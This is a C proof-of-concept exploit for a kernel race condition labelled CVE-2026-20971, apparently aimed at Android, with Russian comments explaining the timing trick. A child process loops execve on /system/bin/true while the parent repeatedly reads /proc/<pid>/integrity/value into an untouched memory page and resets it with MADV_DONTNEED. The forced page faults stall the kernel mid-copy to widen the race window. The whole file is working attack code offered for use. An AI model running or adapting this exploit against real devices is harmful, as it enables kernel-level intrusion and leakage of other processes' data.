#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <string.h>
#include <sched.h>
#include <signal.h>

int main() {
    printf("[*] CVE-2026-20971 Race Condition PoC v2\n");
    
    pid_t pid = fork();

    if (pid == 0) {
        // --- ПРОЦЕСС-ЖЕРТВА (Child) ---
        // Привязываем к CPU 1, чтобы он работал параллельно с родителем
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(1, &set);
        sched_setaffinity(0, sizeof(set), &set);

        char *argv[] = {"/system/bin/true", NULL};
        char *envp[] = {NULL};
        
        while (1) {
            execve("/system/bin/true", argv, envp);
            _exit(1); // Если execve не удался
        }
    } 
    else if (pid > 0) {
        // --- ПРОЦЕСС-АТАКУЮЩИЙ (Parent) ---
        // Привязываем к CPU 0
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(0, &set);
        sched_setaffinity(0, sizeof(set), &set);

        printf("[*] Child PID: %d\n", pid);
        
        // Выделяем страницу памяти, но НЕ трогаем её. 
        // При попытке ядра скопировать данные сюда (copy_to_user) 
        // произойдет page fault, и ядро уснет, давая время child'у на execve.
        char *buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (buf == MAP_FAILED) {
            perror("mmap");
            kill(pid, SIGKILL);
            return 1;
        }

        char path[64];
        snprintf(path, sizeof(path), "/proc/%d/integrity/value", pid);
        
        long iterations = 0;

        while (1) {
            // Сбрасываем страницу, чтобы при следующем read() 
            // снова произошел page fault
            madvise(buf, 4096, MADV_DONTNEED);

            int fd = open(path, O_RDONLY);
            if (fd >= 0) {
                // read() вызовет паузу в ядре (page fault)
                read(fd, buf, 4096); 
                close(fd);
            }
            
            iterations++;
            if (iterations % 100000 == 0) {
                printf("[*] Iterations: %ld\n", iterations);
            }
            
            if (iterations % 1000 == 0) {
                if (kill(pid, 0) != 0) {
                    printf("[-] Child died unexpectedly.\n");
                    break;
                }
            }
        }
    }
    return 0;
}